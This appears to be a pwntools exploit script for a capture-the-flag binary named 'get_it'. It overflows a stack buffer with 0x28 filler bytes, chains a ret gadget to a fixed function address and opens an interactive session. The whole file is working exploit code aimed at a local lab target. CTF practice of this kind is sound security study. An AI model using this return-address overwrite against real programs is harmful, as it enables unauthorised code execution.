'''
Author: Samrito
Date: 2021-12-15 23:15:01
LastEditors: Samrito
LastEditTime: 2021-12-15 23:22:12
'''
from pwn import *

def debug(argv = ''):
    gdb.attach(io, argv)
    pause()

io = process(argv=['./get_it'])
context.arch = 'amd64'
context.log_level = 'debug'

ret_addr = 0x0400451

# debug('b * main')
io.recvuntil('Do you gets it??\n')
payload = flat([b'@'*(0x20+8), ret_addr,0x004005b6, 0xdeadbeef])
io.sendline(payload)

io.interactive()